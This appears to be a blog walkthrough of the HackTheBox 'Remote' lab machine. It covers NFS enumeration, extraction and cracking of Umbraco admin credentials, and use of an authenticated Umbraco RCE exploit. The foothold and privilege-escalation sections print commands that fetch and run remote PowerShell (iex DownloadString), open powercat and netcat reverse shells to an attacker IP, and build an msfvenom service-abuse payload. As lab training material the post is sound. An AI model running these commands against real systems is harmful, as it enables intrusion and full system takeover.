---
layout: post
title: HackTheBox Remote walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, powercat, powerup, nfs, netcat, powershell, windows, msfvenom, oscp]
comments: true
---

Remote is a HacktheBox windows machine with the ip address 10.10.10.180. Rated as easy on the platform, this machine is highly [CVE](https://cve.mitre.org/about/cve_and_nvd_relationship.html) oriented and similar of what you would encounter in an OSCP exam. I got a foothold on the machine using an authenticated remote code execution on the web server and elevate my privilege through an insecure file permission vulnerability. This box is fun and great to get familiar with windows privilege escalation.

![info_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3b4dc061e2b548afb1e48a934e076f09.png)


# Enumeration

I started with multiple port scans.
## Port scans

![full_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/b7bc801733c0425ab5820880a68c5c86.png)


![detail_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/c6a91f46435c4725bc4b7c6678a4d996.png)


A lot of ports were opened and the enumeration phase can be very time consuming in a penetration test. In order to manage my time efficiently, I spent no longer than 30 minutes on each port and focus my attention in this order:
- Port 80/5985/47001 because they are webservers.
- Port 21, Anonymous login is allowed I might be to upload or download files.
- Port 111/2049 NFS is insecure by design and drives are mounted.
- Port 445 - Samba or SMB can provide very useful information but I need credentials to log in.
- Other ports ...

### Port 80

I found a login page using Umbraco CMS.

![umbraco_login_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/16a50ddcc8054aa5b2bb76c7e12826c8.png)

### Port 111

Network File System (NFS) allow users on client computers to access files over the network as if they were on locally mounted storage. NFS is insecure by design. It's not uncommon to see storage open to the world because of miss configurations.

I used NSE Nmap scripts to discover the name of the mount directory.

![nfs_nse_sancs.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/16cf451fc34d48f58e8d9fb9c7ecd362.png)

I mount the remote drive to a directory.
```bash
mkdir site-backups
sudo mount -o nolock 10.10.10.180:/site-backups $PWD/site-backups
```

Found the Umbraco database in a compact file format ([SDF](https://fileinfo.com/extension/sdf)). *This was the most tricky part in my opinion, things could have become difficult without the knowledge of this file format*.

![found_umbraco.sdf.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8e6c12f1220145e49ab23e099404e464.png)

I extracted the credentials from the raw data and decrypt the password hash [online](https://md5decrypt.net/Sha1/).

![database_content.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/889460b74eb44aa6881903bfcbceaa13.png)

Clair text password:
```plaintext
username: admin@htb.local
password: baconandcheese 
```


# Foothold

I found Umbraco CMS verson with `grep -iR "7.12.4"`. This version were vulnerable to an [authenticated remote code execution](https://www.exploit-db.com/exploits/46153) so I downloaded [noraj Umbraco POC](https://github.com/noraj/Umbraco-RCE). Since I didn't know what was the privileges of the user I was exploiting I executed the `powercat.ps1` script without saving the file on the remote file system by combining the **DownloadString** methode with the **Invoke-Expression** cmdlet ([IEX](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6)).

Listen for connections:
```bash
sudo nc -lnvp 4444
```

Modified powercat script. Replace the Xs with your ip address.
```bash
cp /usr/share/windows-resources/powercat/powercat.ps1 .
echo 'powercat -c X.X.X.X -p 4444 -e cmd.exe' >> powercat.ps1
```

Extended the powercat directory to be accessible from the server.
```bash
sudo python3 -m http.server
```

Exploit umbraco vulnerability.
```bash
sudo python3 Umbraco-RCE/exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a "iex (New-Object System.Net.Webclient).DownloadString('http://X.X.X.X:8000/powercat.ps1')"
```

![foothold_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/31186d2bc4ed47d3bd4bdec20ba4040d.png)

# Privilege escalation

**Insecure file permission** on services that run as `nt authority\system` are often an easy way to elevate privileges. 

I created a binary with **msfvenom** to replace the vulnerable service.
```bash
msfvenom -p windows/x64/exec CMD="C:\Windows\Temp\nc.exe -e cmd.exe X.X.X.X 9001" -f exe -o evil.exe
```

In order to execute all the Powershell commands in the same session, I opened a Powershell interpreter and moved to a writable directory.
```powershell
powershell.exe
cd c:\windows\temp
```

HarmJ0y `PowerUp.ps1` script from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) github repository is an awnsome tool. It uses several tehcniques base on misconfugurations such as unquoted services paths and improper permission on service executables to attent elevate privileges.

I upload PowerUp script into the server and executed Invoke-AllChecks function.
```powershell
iex (New-Object System.Net.Webclient).DownloadString('http://X.X.X.X:8000/PowerUp.ps1')
Invoke-AllChecks
```


![Invoke-AllChecks.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/23ebf8a49b9a47c3b0318d62251b45bc.png)



Downloaded the binary and netcat to the server.
```powershell
powershell.exe -nop (New-Object System.Net.WebClient).DownloadFile('http://X.X.X.X:8000/evil.exe', 'c:\\Windows\\Temp\\evil.exe')
powershell.exe -nop (New-Object System.Net.WebClient).DownloadFile('http://X.X.X.X:8000/nc.exe', 'c:\\Windows\\Temp\\nc.exe')
```

Open a port for reverse shell connections on my machine.
```bash
sudo nc -lvnp 9001
```

And finaly executed `Invoke-ServiceAbuse` function to run the exploit.
```powershell
Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Windows\Temp\evil.exe'
```



![root_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/ddb212d55d1446a4b37e3c57c8b606c8.png)

Thanks for reading !

# References
- [https://fileinfo.com/extension/sdf](https://fileinfo.com/extension/sdf)
- [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6)
- [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
- [https://md5decrypt.net/Sha1/](https://md5decrypt.net/Sha1/)
- [https://www.exploit-db.com/exploits/46153](https://www.exploit-db.com/exploits/46153)
- [https://cve.mitre.org/about/cve_and_nvd_relationship.html](https://cve.mitre.org/about/cve_and_nvd_relationship.html)
